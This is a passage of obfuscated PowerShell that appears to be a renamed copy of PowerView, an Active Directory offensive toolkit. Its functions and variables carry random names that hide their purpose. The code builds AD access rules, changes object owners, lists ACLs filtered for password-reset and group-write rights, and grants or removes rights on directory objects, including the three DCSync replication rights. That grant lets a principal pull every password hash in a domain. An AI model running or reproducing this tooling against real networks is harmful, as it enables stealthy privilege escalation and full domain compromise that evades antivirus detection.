        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $FRgbyCcB99,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $HoXSWxfb99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $uEIRGdCG99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $PAAVLYVS99,
        [Guid]
        $tvARrjyd99
    )
    Begin {
        if ($kuSzUQEs99 -notmatch '^S-1-.*') {
            $VsAvUfia99 = @{
                'Identity' = $kuSzUQEs99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $VsAvUfia99['Domain'] = $vumVLVsx99 }
            if ($PSBoundParameters['Server']) { $VsAvUfia99['Server'] = $YBAlGqrU99 }
            if ($PSBoundParameters['SearchScope']) { $VsAvUfia99['SearchScope'] = $daZTeEQR99 }
            if ($PSBoundParameters['ResultPageSize']) { $VsAvUfia99['ResultPageSize'] = $JFYciBwT99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $VsAvUfia99['ServerTimeLimit'] = $qaKJUqzZ99 }
            if ($PSBoundParameters['Tombstone']) { $VsAvUfia99['Tombstone'] = $mIpZvziV99 }
            if ($PSBoundParameters['Credential']) { $VsAvUfia99['Credential'] = $fxunRYJT99 }
            $lMzKoNOp99 = great @PrincipalSearcherArguments
            if (-not $lMzKoNOp99) {
                throw "Unable to resolve principal: $kuSzUQEs99"
            }
            elseif($lMzKoNOp99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $xcFWvzAE99 = $lMzKoNOp99.objectsid
        }
        else {
            $xcFWvzAE99 = $kuSzUQEs99
        }
        $fexZwuwJ99 = 0
        foreach($r in $Right) {
            $fexZwuwJ99 = $fexZwuwJ99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $fexZwuwJ99 = [System.DirectoryServices.ActiveDirectoryRights]$fexZwuwJ99
        $soGjewdO99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$xcFWvzAE99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($uEIRGdCG99 -eq $null -and $PAAVLYVS99 -eq [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $HoXSWxfb99
            } elseif($uEIRGdCG99 -eq $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $HoXSWxfb99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$PAAVLYVS99)
            } elseif($uEIRGdCG99 -eq $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $HoXSWxfb99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$PAAVLYVS99), $tvARrjyd99
            } elseif($uEIRGdCG99 -ne $null -and $PAAVLYVS99 -eq [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $HoXSWxfb99, $uEIRGdCG99
            } elseif($uEIRGdCG99 -ne $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $HoXSWxfb99, $uEIRGdCG99, $PAAVLYVS99
            } elseif($uEIRGdCG99 -ne $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $HoXSWxfb99, $uEIRGdCG99, $PAAVLYVS99, $tvARrjyd99
            }
        }
        else {
            if($uEIRGdCG99 -eq $null -and $PAAVLYVS99 -eq [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $FRgbyCcB99
            } elseif($uEIRGdCG99 -eq $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $FRgbyCcB99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$PAAVLYVS99)
            } elseif($uEIRGdCG99 -eq $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $FRgbyCcB99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$PAAVLYVS99), $tvARrjyd99
            } elseif($uEIRGdCG99 -ne $null -and $PAAVLYVS99 -eq [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $FRgbyCcB99, $uEIRGdCG99
            } elseif($uEIRGdCG99 -ne $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $FRgbyCcB99, $uEIRGdCG99, $PAAVLYVS99
            } elseif($uEIRGdCG99 -ne $null -and $PAAVLYVS99 -ne [String]::Empty -and $tvARrjyd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $soGjewdO99, $fexZwuwJ99, $FRgbyCcB99, $uEIRGdCG99, $PAAVLYVS99, $tvARrjyd99
            }
        }
    }
}
function kestrels {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $soGjewdO99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $KoxIbHVk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $XOqLFBld99 = great @SearcherArguments -soGjewdO99 $KoxIbHVk99 -rtPnFfWd99 objectsid | Select-Object -ExpandProperty objectsid
        if ($XOqLFBld99) {
            $DvlmwnZs99 = [System.Security.Principal.SecurityIdentifier]$XOqLFBld99
        }
        else {
            Write-Warning "[kestrels] Error parsing owner identity '$KoxIbHVk99'"
        }
    }
    PROCESS {
        if ($DvlmwnZs99) {
            $sMQTvMNR99['Raw'] = $True
            $sMQTvMNR99['Identity'] = $soGjewdO99
            $sFKBIpDb99 = great @SearcherArguments
            ForEach ($Object in $sFKBIpDb99) {
                try {
                    Write-Verbose "[kestrels] Attempting to set the owner for '$soGjewdO99' to '$KoxIbHVk99'"
                    $Entry = $sFKBIpDb99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($DvlmwnZs99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[kestrels] Error setting owner: $_"
                }
            }
        }
    }
}
function cauliflowers {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $soGjewdO99,
        [Switch]
        $Sacl,
        [Switch]
        $OCiVWNZU99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $yiUNNNoG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $sMQTvMNR99['SecurityMasks'] = 'Sacl'
        }
        else {
            $sMQTvMNR99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $GczSkSTf99 = bleachers @SearcherArguments
        $zDNfqwnr99 = @{}
        if ($PSBoundParameters['Domain']) { $zDNfqwnr99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $zDNfqwnr99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['ResultPageSize']) { $zDNfqwnr99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zDNfqwnr99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Credential']) { $zDNfqwnr99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = autopsying @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($GczSkSTf99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^S-1-.*') {
                    $UztPqXyf99 += "(objectsid=$hDkTAaiv99)"
                }
                elseif ($hDkTAaiv99 -match '^(CN|OU|DC)=.*') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[cauliflowers] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $GczSkSTf99 = bleachers @SearcherArguments
                        if (-not $GczSkSTf99) {
                            Write-Warning "[cauliflowers] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                elseif ($hDkTAaiv99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ouzLqIgS99 = (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                }
                elseif ($hDkTAaiv99.Contains('.')) {
                    $UztPqXyf99 += "(|(samAccountName=$hDkTAaiv99)(name=$hDkTAaiv99)(dnshostname=$hDkTAaiv99))"
                }
                else {
                    $UztPqXyf99 += "(|(samAccountName=$hDkTAaiv99)(name=$hDkTAaiv99)(displayname=$hDkTAaiv99))"
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[cauliflowers] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            if ($bNYXjnRz99) {
                $GczSkSTf99.filter = "(&$bNYXjnRz99)"
            }
            Write-Verbose "[cauliflowers] cauliflowers filter string: $($GczSkSTf99.filter)"
            $mKhNNgkp99 = $GczSkSTf99.FindAll()
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $xcFWvzAE99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $xcFWvzAE99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $IvLqhzhW99 = Switch ($yiUNNNoG99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $IvLqhzhW99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $xcFWvzAE99
                                $XrecexFG99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $xcFWvzAE99
                            $XrecexFG99 = $True
                        }
                        if ($XrecexFG99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $xYrLXqtW99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $xYrLXqtW99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $xYrLXqtW99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $xYrLXqtW99[$_.Name] = $_.Value
                                    }
                                }
                                $ySfptyiu99 = New-Object -TypeName PSObject -Property $xYrLXqtW99
                                $ySfptyiu99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $ySfptyiu99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[cauliflowers] Error: $_"
                }
            }
        }
    }
}
function lashed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $HtwdQimx99,
        [ValidateNotNullOrEmpty()]
        [String]
        $QNLwMLiv99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gqQGzDCC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $funPtbjN99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kuSzUQEs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $vumVLVsx99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $PWeCyDaZ99 = 'All',
        [Guid]
        $xQyHkcHY99
    )
    BEGIN {
        $ERQCCorJ99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $ERQCCorJ99['Domain'] = $QNLwMLiv99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $ERQCCorJ99['LDAPFilter'] = $gqQGzDCC99 }
        if ($PSBoundParameters['TargetSearchBase']) { $ERQCCorJ99['SearchBase'] = $funPtbjN99 }
        if ($PSBoundParameters['Server']) { $ERQCCorJ99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $ERQCCorJ99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $ERQCCorJ99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ERQCCorJ99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $ERQCCorJ99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $ERQCCorJ99['Credential'] = $fxunRYJT99 }
        $VsAvUfia99 = @{
            'Identity' = $kuSzUQEs99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $VsAvUfia99['Domain'] = $vumVLVsx99 }
        if ($PSBoundParameters['Server']) { $VsAvUfia99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $VsAvUfia99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $VsAvUfia99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VsAvUfia99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $VsAvUfia99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $VsAvUfia99['Credential'] = $fxunRYJT99 }
        $UrhWAohM99 = great @PrincipalSearcherArguments
        if (-not $UrhWAohM99) {
            throw "Unable to resolve principal: $kuSzUQEs99"
        }
    }
    PROCESS {
        $ERQCCorJ99['Identity'] = $HtwdQimx99
        $pSOghVXH99 = great @TargetSearcherArguments
        ForEach ($pbpXWNuB99 in $pSOghVXH99) {
            $PAAVLYVS99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $MyDjjMwN99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($xQyHkcHY99) {
                $GUIDs = @($xQyHkcHY99)
            }
            else {
                $GUIDs = Switch ($PWeCyDaZ99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($zbuvZXNF99 in $UrhWAohM99) {
                Write-Verbose "[lashed] Granting principal $($zbuvZXNF99.distinguishedname) '$PWeCyDaZ99' on $($pbpXWNuB99.Properties.distinguishedname)"
                try {
                    $soGjewdO99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$zbuvZXNF99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $MNzzSkUJ99 = New-Object Guid $GUID
                            $TDnrRyVg99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $soGjewdO99, $TDnrRyVg99, $MyDjjMwN99, $MNzzSkUJ99, $PAAVLYVS99
                        }
                    }
                    else {
                        $TDnrRyVg99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $soGjewdO99, $TDnrRyVg99, $MyDjjMwN99, $PAAVLYVS99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[lashed] Granting principal $($zbuvZXNF99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($pbpXWNuB99.Properties.distinguishedname)"
                        $bilhZaQq99 = $pbpXWNuB99.GetDirectoryEntry()
                        $bilhZaQq99.PsBase.Options.SecurityMasks = 'Dacl'
                        $bilhZaQq99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $bilhZaQq99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[lashed] Error granting principal $($zbuvZXNF99.distinguishedname) '$PWeCyDaZ99' on $($pbpXWNuB99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function upright {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $HtwdQimx99,
        [ValidateNotNullOrEmpty()]
        [String]
        $QNLwMLiv99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gqQGzDCC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $funPtbjN99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kuSzUQEs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $vumVLVsx99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $PWeCyDaZ99 = 'All',
        [Guid]
        $xQyHkcHY99
    )
    BEGIN {
        $ERQCCorJ99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $ERQCCorJ99['Domain'] = $QNLwMLiv99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $ERQCCorJ99['LDAPFilter'] = $gqQGzDCC99 }
        if ($PSBoundParameters['TargetSearchBase']) { $ERQCCorJ99['SearchBase'] = $funPtbjN99 }
        if ($PSBoundParameters['Server']) { $ERQCCorJ99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $ERQCCorJ99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $ERQCCorJ99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ERQCCorJ99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $ERQCCorJ99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $ERQCCorJ99['Credential'] = $fxunRYJT99 }
        $VsAvUfia99 = @{
            'Identity' = $kuSzUQEs99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $VsAvUfia99['Domain'] = $vumVLVsx99 }
        if ($PSBoundParameters['Server']) { $VsAvUfia99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $VsAvUfia99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $VsAvUfia99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VsAvUfia99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $VsAvUfia99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $VsAvUfia99['Credential'] = $fxunRYJT99 }
        $UrhWAohM99 = great @PrincipalSearcherArguments
        if (-not $UrhWAohM99) {
            throw "Unable to resolve principal: $kuSzUQEs99"
        }
    }
    PROCESS {
        $ERQCCorJ99['Identity'] = $HtwdQimx99
        $pSOghVXH99 = great @TargetSearcherArguments
        ForEach ($pbpXWNuB99 in $pSOghVXH99) {
            $PAAVLYVS99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $MyDjjMwN99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($xQyHkcHY99) {
                $GUIDs = @($xQyHkcHY99)
            }
            else {
                $GUIDs = Switch ($PWeCyDaZ99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($zbuvZXNF99 in $UrhWAohM99) {
                Write-Verbose "[upright] Removing principal $($zbuvZXNF99.distinguishedname) '$PWeCyDaZ99' from $($pbpXWNuB99.Properties.distinguishedname)"
                try {
                    $soGjewdO99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$zbuvZXNF99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $MNzzSkUJ99 = New-Object Guid $GUID
                            $TDnrRyVg99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $soGjewdO99, $TDnrRyVg99, $MyDjjMwN99, $MNzzSkUJ99, $PAAVLYVS99
                        }
                    }
                    else {
                        $TDnrRyVg99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $soGjewdO99, $TDnrRyVg99, $MyDjjMwN99, $PAAVLYVS99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[upright] Granting principal $($zbuvZXNF99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($pbpXWNuB99.Properties.distinguishedname)"
                        $bilhZaQq99 = $pbpXWNuB99.GetDirectoryEntry()
                        $bilhZaQq99.PsBase.Options.SecurityMasks = 'Dacl'
                        $bilhZaQq99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
